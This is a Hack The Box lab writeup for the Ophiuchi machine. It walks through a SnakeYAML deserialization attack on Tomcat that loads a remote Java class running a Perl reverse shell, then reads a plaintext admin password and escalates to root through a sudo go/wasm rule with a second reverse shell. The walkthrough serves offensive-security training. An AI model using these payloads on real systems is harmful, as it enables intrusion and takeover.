---
title: "HTB: Ophiuchi Writeup"
date: 2021-06-07T23:15:00-07:00
categories:
  - blog
  - writeup
  - htb
tags:
  - htb
  - htb medium
  - offsec
---

There are spoilers below for the Hack The Box box named Cap. Stop reading here if you do not want spoilers!!!

---

# Enumeration

```
 nmap -sC -sV -oA nmap/ophiuchi 10.10.10.227
Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-11 15:39 EDT
Nmap scan report for 10.10.10.227
Host is up (0.078s latency).
Not shown: 998 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 6d:fc:68:e2:da:5e:80:df:bc:d0:45:f5:29:db:04:ee (RSA)
|   256 7a:c9:83:7e:13:cb:c3:f9:59:1e:53:21:ab:19:76:ab (ECDSA)
|_  256 17:6b:c3:a8:fc:5d:36:08:a1:40:89:d2:f4:0a:c6:46 (ED25519)
8080/tcp open  http    Apache Tomcat 9.0.38
|_http-title: Parse YAML
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.84 seconds

```


Port 8080 is running a tomcat server with a YAML parser, but when you use it, you receive:

```
Due to security reason this feature has been temporarily on hold. We will soon fix the issue!
```

However, it turns out that it's actually performing the deserialization and simply not displaying the result

```
 curl -i -X POST -d 'data=!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://10.10.14.204/test"]]]]' http://10.10.10.227:8080/yaml/Servlet
```
 
After a bit of research, I located [this repository]() which has a decent example of a serialization attack. Cloning the repository and creating the following setup:
 
```bash
$ tree
.
├── README.md
├── src
│   ├── artsploit
│   │   ├── AwesomeScriptEngineFactory.class
│   │   └── AwesomeScriptEngineFactory.java
│   └── META-INF
│       └── services
│           └── javax.script.ScriptEngineFactory
└── yaml-payload.jar
```

I was able to craft the following Java code to execute a Perl reverse shell

```java
package artsploit;

import javax.script.ScriptEngine;
import javax.script.ScriptEngineFactory;
import java.io.IOException;
import java.util.List;
import java.net.*;
import java.io.*;
import java.util.concurrent.*;

public class AwesomeScriptEngineFactory implements ScriptEngineFactory {

    public AwesomeScriptEngineFactory() {
        try {
            BufferedWriter writer = new BufferedWriter(new FileWriter("/tmp/rshell82.pl"));
            writer.write("use Socket;$i=\"10.10.14.204\";$p=82;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};");
            writer.close();

            Runtime.getRuntime().exec("perl /tmp/rshell82.pl");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    @Override
    public String getEngineName() {
        return null;
    }

    @Override
    public String getEngineVersion() {
        return null;
    }

    @Override
    public List<String> getExtensions() {
        return null;
    }

    @Override
    public List<String> getMimeTypes() {
        return null;
    }

    @Override
    public List<String> getNames() {
        return null;
    }

    @Override
    public String getLanguageName() {
        return null;
    }

    @Override
    public String getLanguageVersion() {
        return null;
    }

    @Override
    public Object getParameter(String key) {
        return null;
    }

    @Override
    public String getMethodCallSyntax(String obj, String m, String... args) {
        return null;
    }

    @Override
    public String getOutputStatement(String toDisplay) {
        return null;
    }

    @Override
    public String getProgram(String... statements) {
        return null;
    }

    @Override
    public ScriptEngine getScriptEngine() {
        return null;
    }
}
```

To execute this, I had to host an HTTP server:

```bash
$ sudo python3 -m http.server 81
Serving HTTP on 0.0.0.0 port 81 (http://0.0.0.0:81/) ...
10.10.10.227 - - [12/Jun/2021 00:42:32] "HEAD /META-INF/services/javax.script.ScriptEngineFactory HTTP/1.1" 200 -
10.10.10.227 - - [12/Jun/2021 00:42:32] "GET /META-INF/services/javax.script.ScriptEngineFactory HTTP/1.1" 200 -
10.10.10.227 - - [12/Jun/2021 00:42:33] "GET /artsploit/AwesomeScriptEngineFactory.class HTTP/1.1" 200 -
```

And catch the reverse shell

```bash
$ sudo rlwrap nc -lvnp 82
listening on [any] 82 ...
connect to [10.10.14.204] from (UNKNOWN) [10.10.10.227] 36388
/bin/sh: 0: can't access tty; job control turned off
$ whoami
tomcat
```

Success! We now have a working shell!!

Since this is a tomcat instance, the first thing I checked was `conf/tomcat-users.xml` for the password

```
<user username="admin" password="whythereisalimit" roles="manager-gui,admin-gui"/>
```

Checking that via SSH, we have successful login with `admin:whythereisalimit`!!

# Privesc

It looks like there's an interesting tool we may execute

```
User admin may run the following commands on ophiuchi:
    (ALL) NOPASSWD: /usr/bin/go run /opt/wasm-functions/index.go
```

So we can run the `index.go` program, looking at it, it contains the following interesting lines:

```go
package main

import (
        "fmt"
        wasm "github.com/wasmerio/wasmer-go/wasmer"
        "os/exec"
        "log"
)


func main() {
        bytes, _ := wasm.ReadBytes("main.wasm")

        instance, _ := wasm.NewInstance(bytes)
        defer instance.Close()
        init := instance.Exports["info"]
        result,_ := init()
        f := result.String()
        if (f != "1") {
                fmt.Println("Not ready to deploy")
        } else {
                fmt.Println("Ready to deploy")
                out, err := exec.Command("/bin/sh", "deploy.sh").Output()
                if err != nil {
                        log.Fatal(err)
                }
                fmt.Println(string(out))
        }
}
```

So, it loads a `main.wasm` file, pulls an `info` exported function from it and executes it, then checks the return value to see if it is `1`. If it is `1`, it then executes `/bin/sh deploy.sh`. 

The good news about the above is that there are no paths specified, meaning that it will pull from the current working directory. So if we can get `info()` to return `1`, we should be good.

Additionally, in the directory where `index.go` is located, there's a `main.wasm` file. Lets see if we can just execute using it.

```
$ cp /opt/wasm-functions/main.wasm .
admin@ophiuchi:/tmp$ sudo /usr/bin/go run /opt/wasm-functions/index.go
Not ready to deploy
```

No such luck, it looks like the `main.wasm` file is not returning `1`.

We have a few options
1. We can try to craft our own `wasm` file that exports a `info` function and return `1` from it
2. We can try to edit the existing `main.wasm` file to adjust `info` to return `1`.

Since I've never crafted a `wasm` file before, I opted to go for the second option. It looks like we can disasemble `wasm` into an editable format using [wabt](https://github.com/webassembly/wabt). 

```bash
$ git clone https://github.com/WebAssembly/wabt.git
$ cd wabt
$ git submodule update --init
$ mkdir build
$ cd build
$ cmake -DBUILD_TESTS=OFF .. 
$ cmake --build .
```

After successfully building, we can use `wasm2wat` to decompile the `wasm` file and `wat2wasm` to compile it back into a `wasm` file.

```bash
$ scp admin@10.10.10.227:/opt/wasm-functions/main.wasm .
$ wabt/bin/wasm2wat main.wasm -o main.wat
```

The `wat` file is pretty straightforward

```
(module
  (type (;0;) (func (result i32)))
  (func $info (type 0) (result i32)
    i32.const 0)
  (table (;0;) 1 1 funcref)
  (memory (;0;) 16)
  (global (;0;) (mut i32) (i32.const 1048576))
  (global (;1;) i32 (i32.const 1048576))
  (global (;2;) i32 (i32.const 1048576))
  (export "memory" (memory 0))
  (export "info" (func $info))
  (export "__data_end" (global 1))
  (export "__heap_base" (global 2)))
```

With a minor tweak to it, we can change the return value of `$info`

```
(module
  (type (;0;) (func (result i32)))
  (func $info (type 0) (result i32)
    i32.const 1)
  (table (;0;) 1 1 funcref)
  (memory (;0;) 16)
  (global (;0;) (mut i32) (i32.const 1048576))
  (global (;1;) i32 (i32.const 1048576))
  (global (;2;) i32 (i32.const 1048576))
  (export "memory" (memory 0))
  (export "info" (func $info))
  (export "__data_end" (global 1))
  (export "__heap_base" (global 2)))
```

Now, reassembling the file:

```bash
$ wabt/bin/wat2wasm main.wat -o main.wasm
$ scp main.wasm admin@10.10.10.227:/tmp/
```

Now that we have the changed `main.wasm` ready, lets craft a simple reverse shell payload and execute the `index.go` script.

```bash
$ cat deploy.sh 
#!/bin/bash

perl -e 'use Socket;$i="10.10.14.204";$p=83;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
$ sudo /usr/bin/go run /opt/wasm-functions/index.go
Ready to deploy
```

Catching the reverse shell with a netcat listener:

```bash
$ sudo rlwrap nc -lnvp 83
listening on [any] 83 ...
connect to [10.10.14.204] from (UNKNOWN) [10.10.10.227] 36116
id
uid=0(root) gid=0(root) groups=0(root)
# 
```

Success!! We have root!
